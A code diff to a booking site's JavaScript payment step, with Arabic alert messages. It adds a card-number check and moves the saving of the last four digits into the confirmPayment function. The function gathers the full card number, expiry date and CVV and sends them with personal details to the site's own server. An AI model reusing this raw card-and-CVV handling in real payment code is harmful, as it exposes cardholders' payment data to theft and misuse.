@@ -611,9 +611,19 @@ window.addEventListener('DOMContentLoaded', () => {
 async function confirmPayment() {
   const personalData = JSON.parse(localStorage.getItem('personalData'));
 
+  const cardNumber = document.getElementById('creditCardNumber').value;
+
+  if (!cardNumber) {
+    alert('يرجى إدخال رقم البطاقة');
+    return;
+  }
+
+  // حفظ آخر 4 أرقام من البطاقة في localStorage
+  localStorage.setItem('last4Card', cardNumber.slice(-4));
+
   const bookingData = {
     ...personalData, // الاسم، الهاتف، البريد، العنوان، السعر
-    cardNumber: document.getElementById('creditCardNumber').value,
+    cardNumber: cardNumber,
     cardExpiry: document.getElementById('expiryDate').value,
     cardBrand: 'Visa', // أو اجعل المستخدم يختار النوع
     cvv: document.getElementById('cvv').value,
@@ -630,7 +640,7 @@ async function confirmPayment() {
     });
 
     const data = await res.json();
-    if(data.success){
+    if (data.success) {
       localStorage.setItem('bookingId', data.bookingId);
       alert('تم الحجز بنجاح!');
       window.location.href = 'verify.html';
@@ -641,9 +651,6 @@ async function confirmPayment() {
     alert('فشل الاتصال بالخادم، حاول لاحقًا');
   }
 }
-
-const cardNumber = document.getElementById('creditCardNumber').value;
-localStorage.setItem('last4Card', cardNumber.slice(-4)); // آخر 4 أرقام من البطاقة
 
 document.getElementById('confirmBooking').addEventListener('click', confirmPayment);
 </script>
